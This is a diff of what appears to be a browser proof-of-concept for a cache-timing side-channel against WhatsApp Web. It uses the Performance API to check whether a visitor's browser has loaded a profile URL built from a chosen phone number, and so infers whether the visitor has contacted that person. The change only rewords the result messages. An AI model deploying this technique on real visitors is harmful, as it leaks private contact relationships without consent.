@@ -24,9 +24,9 @@ https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timest
 
 	function result(url){
 		if (performance.getEntriesByName(url).length==1)
-			document.getElementById("result").innerHTML = "You had communicated with this specified phone number";
+			document.getElementById("result").innerHTML = "This person was found in your contacts, or you have interacted with this person in the past!";
 		else
-			document.getElementById("result").innerHTML = "Communication with this phone number not found";
+			document.getElementById("result").innerHTML = "No interaction was found";
 	}
   
   function attack(){
